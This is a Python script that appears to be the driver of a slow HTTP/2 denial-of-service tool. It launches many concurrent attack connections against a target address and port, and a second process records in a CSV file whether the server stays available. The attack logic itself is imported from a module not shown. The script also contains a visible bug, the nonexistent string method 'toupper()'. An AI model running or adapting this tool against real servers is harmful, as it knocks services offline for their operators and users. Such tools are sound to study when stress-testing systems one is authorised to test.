import time
import multiprocessing
import pathos.multiprocessing
from slowhttp2settings import LOGGER, WebServerStatus, CSVHandler, Timer, args
from slowhttp2attack import cons, closed, Attack

MAX_CONS = args.connection

def thread1():
    """First thread with executing timer, server status, datbase handling"""
    while(closed.value<MAX_CONS):
        status = WebServerStatus(args.address, args.port)
        get_status = status.check_server()
        d = [timer.step(), cons.value - var.value - closed.value if cons.value != 0
             else cons.value - closed.value, MAX_CONS - cons.value + var.value
             if cons.value != 0 else MAX_CONS, closed.value,
             MAX_CONS if get_status else 0]
        database.locked_write(d)
        if(var.value>0):
            with var.get_lock():
                var.value -= 1

def thread2():
    """Second thread executing given attack"""
    start_time = time.time()
    attack = Attack(args.type)

    with pathos.multiprocessing.ProcessingPool(MAX_CONS) as pool:
        pool.map(attack.start_attack, range(MAX_CONS))
    print("SLOW"+args.type.toupper()+"ATTACK has been executed successfully on "
          +str(args.connection)+" connections.")
    print("Total execution time is {}s.".format(time.time() - start_time))


if __name__ == '__main__':
    database = CSVHandler()
    initial_row = ["Time", "Connected", "Pending", "Closed", "Service_Available"]
    database.write(initial_row)

    timer = Timer(0.5)
    var = multiprocessing.Value('i', int(MAX_CONS/10))

    p1 = multiprocessing.Process(target=thread1)
    p1.start()
    p2 = multiprocessing.Process(target=thread2)
    p2.start()
    p1.join()
    p2.join()

